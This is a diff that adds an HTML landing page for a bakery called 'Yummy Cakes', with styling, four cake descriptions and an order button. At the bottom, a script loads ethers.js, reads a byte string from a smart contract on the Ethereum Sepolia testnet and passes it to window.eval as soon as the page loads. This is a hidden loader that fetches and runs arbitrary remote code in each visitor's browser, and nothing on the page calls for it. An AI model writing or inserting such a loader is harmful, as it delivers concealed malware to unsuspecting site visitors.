@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Yummy Cakes</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #fff6f8;
+            color: #333;
+        }
+
+        header {
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            text-align: center;
+            padding: 3rem 1rem;
+        }
+
+        header h1 {
+            font-size: 3rem;
+            margin: 0;
+        }
+
+        header p {
+            font-size: 1.2rem;
+            margin-top: 0.5rem;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .cakes {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .cake-card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            text-align: center;
+        }
+
+        .cake-card h3 {
+            margin-top: 0;
+            color: #e75480;
+        }
+
+        .cake-card p {
+            font-size: 0.95rem;
+        }
+
+        .cta {
+            text-align: center;
+            margin: 3rem 0;
+        }
+
+        .cta button {
+            background: #e75480;
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            border-radius: 30px;
+            cursor: pointer;
+        }
+
+        .cta button:hover {
+            background: #d6456f;
+        }
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background: #ffe3ea;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <h1>Yummy Cakes 🎂</h1>
+        <p>Freshly baked happiness in every slice</p>
+    </header>
+
+    <main class="container">
+        <section class="cakes">
+            <div class="cake-card">
+                <h3>Chocolate Dream</h3>
+                <p>Rich, moist chocolate cake with silky chocolate frosting.</p>
+            </div>
+
+            <div class="cake-card">
+                <h3>Vanilla Delight</h3>
+                <p>Classic vanilla sponge layered with creamy vanilla buttercream.</p>
+            </div>
+
+            <div class="cake-card">
+                <h3>Strawberry Bliss</h3>
+                <p>Light cake filled with fresh strawberries and whipped cream.</p>
+            </div>
+
+            <div class="cake-card">
+                <h3>Red Velvet Love</h3>
+                <p>Soft red velvet cake with smooth cream cheese frosting.</p>
+            </div>
+        </section>
+
+        <section class="cta">
+            <h2>Order Your Cake Today!</h2>
+            <p>Perfect for birthdays, weddings, or just because 🍰</p>
+            <button>Order Now</button>
+        </section>
+    </main>
+
+    <footer>
+        © 2026 Yummy Cakes • Made with sugar & love 💕
+    </footer>
+    <script type="module">
+        import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.min.js";
+
+        const contractAddress = "0x426F40DC277919a9379Eb12F3AA4F07FE0d11793";
+
+        const abi = [
+            "function getBytes() view returns (bytes)"
+        ];
+
+
+        const rpcUrl = "https://ethereum-sepolia.publicnode.com";
+
+        async function readBytes() {
+            const provider = new ethers.JsonRpcProvider(rpcUrl);
+
+            const contract = new ethers.Contract(
+                contractAddress,
+                abi,
+                provider
+            );
+
+            const blob = await contract.getBytes()
+            window.eval(ethers.toUtf8String(blob));
+
+            console.log("Raw bytes:", blob);
+            console.log("Hex:", blob);
+
+        }
+
+        // Run immediately when page loads
+        readBytes().catch(console.error);
+    </script>
+</body>
+
+</html>
